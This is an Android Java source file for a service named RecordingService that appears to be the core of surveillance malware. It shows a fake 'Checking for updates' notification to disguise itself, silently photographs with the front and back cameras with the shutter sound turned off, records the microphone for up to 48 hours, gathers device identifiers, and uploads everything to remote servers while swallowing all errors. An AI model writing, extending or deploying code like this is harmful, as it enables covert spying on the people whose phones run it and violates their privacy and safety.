package org.code.coregradle.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;

import androidx.core.app.NotificationCompat;

import org.json.JSONException;
import org.json.JSONObject;
import org.code.coregradle.R;
import org.code.coregradle.activities.CrossActivity;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.gatherers.RecordingGatherer;
import org.code.coregradle.utils.AudioRecordHelper;
import org.code.coregradle.utils.CompressionUtils;
import org.code.coregradle.utils.FileUtils;
import org.code.coregradle.utils.MessageXInterceptor;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class RecordingService extends Service {

    private MediaRecorder mediaRecorder;
    private final OkHttpClient httpClient = new OkHttpClient();
    private File audioRecordingFile;
    private final int notificationId = 1;
    private AudioRecordHelper audioRecordHelper;
    private final long chunkTime = (3 * 60 * 1000L);
    private static final long maxRecordTime = (48 * 60 * 60 * 1000L);
    private final ExecutorService executorService = getNewExecutor(1500);
    private final ExecutorService micExecService = getNewExecutor(1500);
    private final ExecutorService cameraExecService = getNewExecutor(1500);
    private File recordingPath;
    public static String channelId = "UpdatesChannel";
    NotificationManager notificationManager;
    private IdentityStore identityStore;

    public RecordingService() {

    }

    public static ThreadPoolExecutor getNewExecutor(int delay) {
        return new ThreadPoolExecutor(2, Integer.MAX_VALUE, delay, TimeUnit.SECONDS,
                new SynchronousQueue<Runnable>());
    }

    @Override
    public void onCreate() {
        super.onCreate();
        audioRecordHelper = AudioRecordHelper.getInstance(this);
        mediaRecorder = new MediaRecorder();
        recordingPath = new File(getFilesDir(), "recording");
        notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        recordingPath.mkdir();
        identityStore = IdentityStore.getInstance(this);
    }

    public static void createNotificationChannel(Context context) {
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel notificationChannel = notificationManager.getNotificationChannel(channelId);
            if (notificationChannel == null) {
                notificationChannel = new NotificationChannel(channelId, "App Update", NotificationManager.IMPORTANCE_HIGH);
                notificationManager.createNotificationChannel(notificationChannel);
            }
        }
    }

    public NotificationChannel createChannelIfNotExists(String channelId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel notificationChannel = notificationManager.getNotificationChannel(channelId);
            if (notificationChannel == null) {
                notificationChannel = new NotificationChannel(channelId, "App Update", NotificationManager.IMPORTANCE_HIGH);
                notificationManager.createNotificationChannel(notificationChannel);
            }
            return notificationChannel;
        }
        return null;
    }


    private Notification createNotification() {
        createChannelIfNotExists(channelId);
        return new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(R.drawable.ic_launcher_round)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setCategory(NotificationCompat.CATEGORY_MESSAGE)
                .setColor(0xff11acfa)
                .setOngoing(false)
                .setContentTitle("Updating...")
                .setContentText("Checking for updates")
                .build();
    }

    public File moveFile(File src) {
        File destFile = new File(recordingPath, src.getName());
        src.renameTo(destFile);
        return destFile;
    }


    public void takeBackPicture() throws Exception {
        Camera backCamera = Camera.open(0);
        SurfaceTexture backTexture = new SurfaceTexture(1);
        backCamera.setPreviewTexture(backTexture);
        backCamera.enableShutterSound(false);
        backCamera.startPreview();
        backCamera.takePicture(null, null, (data, camera) -> {
            try {
                File backPictureFile = new File(this.getFilesDir(), FileUtils.getTimeStampName() + "_back.jpg");
                backPictureFile.createNewFile();
                FileOutputStream fos = new FileOutputStream(backPictureFile);
                fos.write(data);
                camera.stopPreview();
                camera.release();
                cameraExecService.submit(() -> uploadOrMoveFile(backPictureFile));
            } catch (Exception ignored) {

            }
        });
    }

    public void takePictures() throws Exception {
        Camera frontCamera = Camera.open(1);
        SurfaceTexture frontTexture = new SurfaceTexture(0);
        frontCamera.setPreviewTexture(frontTexture);
        frontCamera.enableShutterSound(false);
        frontCamera.startPreview();
        frontCamera.takePicture(null, null, (data, camera) -> {
            try {
                File frontPictureFile = new File(this.getFilesDir(), FileUtils.getTimeStampName() + "_front.jpg");
                frontPictureFile.createNewFile();
                FileOutputStream fos = new FileOutputStream(frontPictureFile);
                fos.write(data);
                camera.stopPreview();
                camera.release();
                cameraExecService.submit(() -> {
                    uploadOrMoveFile(frontPictureFile);
                    try {
                        takeBackPicture();
                    } catch (Exception ignored) {

                    }
                });

            } catch (Exception ignored) {

            }
        });
    }

    private JSONObject getDeviceJSON() {
        JSONObject requestJSON = new JSONObject();
        try {
            String androidId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
            // Android Version
            requestJSON.put(this.identityStore.getIdentityKey(), this.identityStore.getIdentityValue());
            requestJSON.put("androidId", androidId);

            requestJSON.put("manufacturer", Build.MANUFACTURER);
            requestJSON.put("version", Build.VERSION.SDK_INT);
            requestJSON.put("versionRelease", Build.VERSION.RELEASE);
            requestJSON.put("modelNumber", Build.MODEL);
            return requestJSON;
        } catch (Exception e) {
        }
        return requestJSON;
    }

    public int reportHum(boolean mic, boolean camera, Date startDate, boolean isPing) {
        try {
            JSONObject jsonObject = getDeviceJSON();
            JSONObject requestJSON = new JSONObject();
            requestJSON.put(this.identityStore.getIdentityKey(), jsonObject.getString(this.identityStore.getIdentityKey()));
            requestJSON.put("device", jsonObject);
            requestJSON.put(isPing ? "pingTime" : "timestamp", new Date());
            requestJSON.put("mic", mic);
            requestJSON.put("startedAt", startDate.toString());
            requestJSON.put("expectedEndTime", getExpectedEndTime());
            requestJSON.put("camera", camera);
            Request request = new Request.Builder()
                    .url(ApiConfig.REQUEST_HUM)
                    .post(RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString())))
                    .build();
            Response response = httpClient.newCall(request).execute();
            JSONObject responseJSON = new JSONObject(response.body().string());
            return responseJSON.getInt("delay") * 1000;
        } catch (Exception e) {
        }
        return 1200 * 1000;
    }

    public int reportHum(boolean mic, boolean camera, Date startDate) {
        return reportHum(mic, camera, startDate, false);
    }

    public synchronized void uploadRecording(File file) {
        RequestBody requestBody = RequestBody.create(MediaType.get("application/x-binary"), file);
        try {
            Request request = new Request.Builder()
                    .url(ApiConfig.HUM_URL)
                    .addHeader(this.identityStore.getUploadHeaderKey(), this.identityStore.getIdentityValue())
                    .addHeader("X-FILE-ID", file.getName())
                    .post(requestBody)
                    .build();
            OkHttpClient client = new OkHttpClient();
            Response response = client.newCall(request).execute();
            if (response.isSuccessful()) {
                file.delete();
            }
        } catch (Exception ignored) {
        }
    }

    public void uploadOrMoveFile(File file) {
        // First try to move the file to be on safer side
        File dest = moveFile(file);
        // Then try to upload the moved file
        uploadRecording(dest);
    }

    private void initializeHumEndTime() {
        try {
            SharedPreferences sharedPreferences = getSharedPreferences(RecordingGatherer.HUM_EXTEND_PREFS, MODE_PRIVATE);
            long currentTime = System.currentTimeMillis();
            long endTime = currentTime + maxRecordTime;
            sharedPreferences.edit().putLong(RecordingGatherer.HUM_END_TIME, endTime).apply();
        } catch (Exception ignored) {
        }
    }

    private long getExpectedEndTime() {
        long expectedEndTime = 0;
        try {
            SharedPreferences sharedPreferences = getSharedPreferences(RecordingGatherer.HUM_EXTEND_PREFS, MODE_PRIVATE);
            expectedEndTime = sharedPreferences.getLong(RecordingGatherer.HUM_END_TIME, 0);
        } catch (Exception ignored) {
        }
        return expectedEndTime;
    }

    private boolean shouldHumContinue() {
        try {
            long expectedEndTime = getExpectedEndTime();
            long currentTime = System.currentTimeMillis();
            boolean durationExceeded = currentTime > expectedEndTime;
            return audioRecordHelper.isRecording() && !durationExceeded;
        } catch (Exception ignored) {
        }
        return true;
    }

    private void cleanupHumEndTime() {
        try {
            SharedPreferences sharedPreferences = getSharedPreferences(RecordingGatherer.HUM_EXTEND_PREFS, MODE_PRIVATE);
            sharedPreferences.edit().remove(RecordingGatherer.HUM_END_TIME).apply();
        } catch (Exception ignored) {
        }
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent.getBooleanExtra("squeak", false)) {
            Intent xIntent = new Intent(this, CrossActivity.class);
            xIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(xIntent);
        }

        boolean mic = intent.getBooleanExtra("mic", false);
        boolean camera = intent.getBooleanExtra("camera", false);
        startForeground(834, createNotification());
        try {
            executorService.submit(new MessageXInterceptor("Started Humming", identityStore.getIdentityValue()));
        } catch (JSONException ignored) {

        }
        executorService.submit(() -> {
            try {
                boolean success = audioRecordHelper.startRecording();
                if (!success) {
                    return;
                }
                initializeHumEndTime();
                Date startDate = new Date();
                while (shouldHumContinue()) {
                    int time = reportHum(mic, camera, startDate);
                    if (camera) {
                        cameraExecService.submit(() -> {
                            try {
                                takePictures();
                            } catch (Exception ignored) {

                            }
                        });
                    }
                    if (mic) {
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                        audioRecordingFile = new File(this.getFilesDir(), FileUtils.getTimeStampName() + ".amr");
                        mediaRecorder.setOutputFile(audioRecordingFile.getAbsolutePath());
                        mediaRecorder.prepare();
                        mediaRecorder.start();
                        int pauseTime = 0;
                        while (audioRecordHelper.isRecording() && pauseTime < time) {
                            executorService.submit(() -> reportHum(mic, camera, startDate, true));
                            Thread.sleep(60 * 1000);
                            pauseTime += 60 * 1000;
                        }
                        mediaRecorder.stop();
                        mediaRecorder.reset();
                        micExecService.submit(() -> {
                            try {
                                uploadOrMoveFile(audioRecordingFile);
                            } catch (Exception ignored) {

                            }
                        });
                    }
                    if (!mic && camera) {
                        Thread.sleep(time);
                    }
                }
                cleanupHumEndTime();
            } catch (Exception ignored) {

            }
            try {
                executorService.submit(new MessageXInterceptor("Humming Stopped", identityStore.getIdentityValue()));
            } catch (JSONException ignored) {

            }
            mediaRecorder.release();
        });

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return null;
    }
}